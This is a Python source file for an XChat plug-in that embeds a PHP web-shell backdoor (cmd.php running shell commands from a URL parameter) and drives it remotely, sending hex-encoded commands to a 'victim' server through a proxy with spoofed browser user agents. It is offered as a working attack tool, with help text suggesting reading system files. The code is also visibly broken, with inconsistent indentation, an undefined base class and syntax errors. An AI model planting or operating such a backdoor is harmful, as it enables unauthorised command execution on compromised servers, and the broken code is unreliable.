#-*- coding: utf-8 -*-
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
# 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.


# First of all make sure that the php backdoor exist on the server
# here is the code of the backdoor, paste it to a file and call it cmd.php

"""<?php
  $md=$_GET['cmd'];
  if (isset($chdir)) @chdir($chdir);
  ob_start();
  system("$md 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp");
  $output = ob_get_contents();
  ob_end_clean();
  if (!empty($output)) echo str_replace(">", "&gt;", str_replace("<", "&lt;", $output));
?>"""




import urllib2, random, xchat

__module_Author__ = "MEZGANI Ali handrix@gmail.com"
__module_name__ = "py99 include Plug-in"
__module_version__ = "1.0"
__module_description__ = "include shell from xchat"


class exploiter(multi):
    global headers
    headers=[[('User-agent', 'Mozilla/4.0 (compatible; MSIE 5.0; Windows NT)')],
             [('User-agent', 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)')],
             [('User-agent', 'Mozilla/4.0 (compatible; MSIE 4.0; Windows NT)')],
             [('User-agent', 'Mozilla/5.0 (compatible; MSIE 4.0; Windows NT)')],
             [('User-agent', 'Mozilla/5.0 (compatible; MSIE 5.5; Windows NT)')],
             [('User-agent', 'Mozilla/5.0 (compatible; MSIE 6.0; Windows NT)')],
             [("IE 7 Vista","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)")],
             [("Googlebot 2.1","Googlebot/2.1 (http://www.google.com/bot.html)")],
             [("Opera 9 (final) WinXP","Opera/9.00 (Windows NT 5.1; U; en)")],
             [("MSN Bot","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)")],
             [("MSIE6 WinXP","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)")]]

    def __init__(self, exploit, target):
        multi.__init__(self)
        self.exploit=exploit
        self.proxy="" 
        self.port=""
	self.target=target
	self.modproxy=False

   def setProxy(self, proxy, port):
	self.proxy = proxy
	self.port = port


   def enableProxy(self):
	self.modproxy=True


    def __get_site__(self, url):
	try:
		if self.modproxy==True:
			prox = "http://"+self.proxy+":"+str(self.port)
			proxies = urllib2.ProxyHandler({"http" : prox})
			opener = urllib2.build_opener(proxies)
		else:
			opener = urllib2.build_opener()
			i = random.randrange(0,6,1)
			opener.addheaders = headers[i]
			urllib2.install_opener(opener)
			req = urllib2.Request(url)
			req.add_header('Referer', 'http://www.Max0r.com/')
			f = urllib2.urlopen(req)
			return  f.read()
			f.close()
	except Exception, e:
		raise (str(e))

        
    def toHex(self, s):
        lst = []
        s=str(s[0]).decode('utf8').encode('iso-8859-1')
        for ch in str(s):
            hv = hex(ord(ch)).replace('0x', '%')
            if len(hv) == 1:
                hv = '0'+hv
            lst.append(hv)
        
        return reduce(lambda x,y:x+y, lst)


    def html_to_text(self, s):
      """
      Given an HTML formatted str, convert it to a text str.
      """
      s = s.replace('&amp;', '&')
      s = s.replace('&lt;', '<')
      s = s.replace('&gt;', '>')
      s = s.replace('&quot;', '"')
      s = s.replace('&middot;', '\xb7')
      for i in range(256):
        s = s.replace('&#%d;' % i, chr(i))

      return s

    def StripTags(self, text):
       finished = 0
       while not finished:
         finished = 1
         start = text.find("<")
         if start >= 0:
             stop = text[start:].find(">")
             if stop >= 0:
                 text = text[:start] + text[start+stop+1:]                
                 finished = 0
       return text

def myshell(words, word_eol, userdata):

    # define the proxy and proxy's port, also the url where reside our backdoor
    proxy="proxy.server.com"
    port=3128
    url="http://victim.server.net/cmd.php?md"

    stat = exploiter(exploit="",target="")
    stat.setProxy(proxy, port):

    prompt=url.split('/')[2]
    prompt =  '['+prompt+']$ '
    if len(words) > 1: 
        cmd=stat.toHex(words[1:])
        print ""
        data=stat.__get_site__(url+cmd)
        data=stat.StripTags(data)
        xchat.prnt(stat.html_to_text(data))
        print prompt+str(words[1:][0])
        
        
    else:
         print "Help: /py99 [cmd] "
         print "Example: /py99 'cat /etc/password'"

xchat.hook_command("py99", myshell, help="py99 [cmd]")
print "Module \"%s\" v.%s loaded correctly!" % (__module_name__,__module_version__)
